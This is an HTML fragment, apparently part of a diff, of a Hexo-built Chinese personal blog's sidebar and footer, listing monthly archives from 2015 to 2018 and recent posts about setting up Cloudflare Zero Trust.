class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/05/01/zero-trust-private-dns/index/">Cloudflare Zero Trust 添加私有解析DNS</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/29/cloudflare-access-gfwed-server/index/">使用Cloudflare Zero Trust连接被墙的服务器</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/22/zero-trust-login-method/index/">Cloudflare Zero Trust App Launcher、Access Group及添加新的登录验证方式</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/20/zero-trust-access-web/index/">使用Cloudflare Zero Trust保护你的Web应用</a>
+          </li>
+        
+          <li>
+            <a href="/2023/04/01/cf-zero-trust/index/">使用Cloudflare Zero Trust创建大内网</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 Benny小土豆<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
